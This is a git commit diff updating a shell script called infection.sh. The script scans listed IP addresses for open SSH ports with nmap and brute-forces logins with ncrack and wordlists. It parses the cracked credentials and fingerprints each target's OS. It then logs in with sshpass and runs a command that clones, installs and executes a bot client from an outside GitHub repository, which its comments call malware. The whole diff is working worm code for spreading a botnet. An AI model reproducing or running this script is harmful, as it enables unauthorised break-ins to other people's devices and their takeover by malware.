43cab77d328019d86d00e046f4f8468b6c246905
HakanKurtt <hakan.kurtt@hotmail.com>
2018-05-21 06:50:54 -0700

    Infection script updated.

--- infection.sh
+++ infection.sh
@@ -6,9 +6,14 @@ then
   apt-get install nmap;
 fi
 
-#Scan the network for open ssh ports with given ip address then create an output.
-sudo nmap -iL ipaddress.txt -oX output -p 22
 
+
+
+
+
+#Scan the network for open ssh ports with given ip address then create an output.
+sudo nmap -O -iL ipaddress.txt -oX output -p 22
+echo "XXXXXXXXXXXX"
 
 
 #If ncrack is not installed then install it.
@@ -18,19 +23,30 @@ then
 fi
 
 #Try to find username and password of the device which port of the ssh is opened with existing username and pass lists.
+#resultNcrack=$(ncrack -iX output -U usernamelist.txt -P passwordlist.txt -p 22 | grep 'ssh:')
 resultNcrack=$(ncrack -iX output -U usernamelist.txt -P passwordlist.txt -p 22 | grep 'ssh:')
 
+echo $resultNcrack
 
 #Parse the ip address, username and password of the vulnerable device from the ncrack output.
 ipAddress=$(echo $resultNcrack | grep 'ssh' | awk  {'print $1'})
 username=$(echo $resultNcrack | grep 'ssh' | cut -d "'" -f 2)
 password=$(echo $resultNcrack | grep 'ssh' | cut -d "'" -f 4)
 
+echo $ipAddress $username $password
+
+
+
+osResult=$(grep $ipAddress -A 10 output| grep osclass | cut -d '"' -f 4)
+raspResult=$(grep $ipAddress -A 10 output | grep Raspberry | cut -d '"' -f 6 | awk {'print $1'})
+
+
+echo "RESULTS = $osResult $raspResult"
+
 #Getting OS. 0=Linux(ubuntu) 1=Raspberrypi 2=Windows
-if [ $(cat output | grep $ipAddress -A 10 | grep osclass | cut -d '"' -f 4) = 'Linux']
-then
-  if [ $(cat output | grep $ipAddress -A 10 | grep Raspberry | cut -d '"' -f 6 | awk {'print $1'}) = 'Raspberry']
-  then
+if [  $osResult = 'Linux' ]; then
+  if [ $raspResult = 'Raspberry' ]; then
+    echo "RASPBERRY"
     os=1
   else
     os=0
@@ -38,6 +54,8 @@ then
 else
   os=2
 fi
+
+echo "Operating system = $os"
 
 #If sshpass package is not installed then install it.
   if [ $(dpkg-query -W -f='${Status}' sshpass 2>/dev/null | grep -c "ok installed") -eq 0 ];
@@ -51,24 +69,13 @@ fi
   fi
 
 #Try to connect to vulnerable device through shh and it's operating system.
-if [ os -eq 0]
+if [ $os -eq 0 ]; then
   #Try to connect to vulnerable device through ssh and install the malware and execute it.
   sshpass -p $password ssh -o StrictHostKeyChecking=no $username@$ipAddress "git clone https://github.com/HakanKurtt/MHBot-client; cd MHBot-client;npm install;node client.js"
-
-elif [ os -eq 1]
-then
+elif [ $os -eq 1 ]; then
 #Try to connect to vulnerable device through ssh and install the malware and execute it.
 sshpass -p $password ssh -o StrictHostKeyChecking=no $username@$ipAddress "git clone https://github.com/HakanKurtt/MHBot-client; cd MHBot-client;npm install;node client.js"
 else
 #Try to connect to vulnerable device through ssh and install the malware and execute it.
 sshpass -p $password ssh -o StrictHostKeyChecking=no $username@$ipAddress "git clone https://github.com/HakanKurtt/MHBot-client; cd MHBot-client;npm install;node client.js"
-then
-
-
-
-
-
-
-
-#Try to connect to vulnerable device through ssh and install the malware and execute it.
-sshpass -p $password ssh -o StrictHostKeyChecking=no $username@$ipAddress "git clone https://github.com/HakanKurtt/MHBot-client; cd MHBot-client;npm install;node client.js"
+fi
